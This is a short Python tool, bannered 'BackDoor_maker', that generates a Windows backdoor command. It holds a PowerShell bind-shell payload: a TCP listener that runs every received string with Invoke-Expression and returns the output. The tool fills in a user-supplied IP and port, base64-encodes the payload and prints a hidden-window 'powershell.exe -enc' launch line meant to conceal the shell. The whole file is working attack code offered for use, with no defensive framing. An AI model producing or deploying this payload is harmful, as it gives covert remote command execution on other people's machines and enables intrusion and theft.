import os
import time
import base64
import socket
import colorama

colorama.init()

print(colorama.Fore.RED + "\nBackDoor_maker...\n")

payloads = [
    ["powershell", """While($True){Try{$endPoint = [System.Net.IPEndPoint]::new([System.Net.IPAddress]::Parse('<ip>'), <port>);$client = [System.Net.Sockets.TcpListener]::new($endPoint);$client.Start();$AcceptTcpClient = $client.AcceptTcpClient();$stream = $AcceptTcpClient.GetStream();While ($True) {;$buffer = New-Object System.Byte[] 4024;$read = $stream.Read($buffer, 0, 4024);$msg = [System.Text.Encoding]::ASCII.GetString($buffer,0, $read);$Output = Invoke-Expression $msg 2>&1 | Out-String;$message = [System.Text.Encoding]::ASCII.GetBytes($Output);$stream.Write($message, 0, $message.Length);}} catch {}}""", "Start-Process powershell.exe {powershell.exe -enc", "} -WindowStyle hidden"],
]

def encrypt_string(text):
    utf16le_bytes = text.encode('utf-16le')

    base64_encoded = base64.b64encode(utf16le_bytes).decode('utf-8')

    return base64_encoded

while True:
    print("")
    for i in range(len(payloads)):
        print(f"{colorama.Fore.GREEN}[{i}]-[{payloads[i][0]}]")
    print("")

    n = int(input(colorama.Fore.RED + f"@BackDoor_maker=>"))

    try:
        ip = input("IP>")
        port = input("PORT>")

        print("")
        print(payloads[n][2], encrypt_string(payloads[n][1].replace("<ip>", ip).replace("<port>", f"{port}")), payloads[n][3])
        print("")
        break

    except:
        print("error")
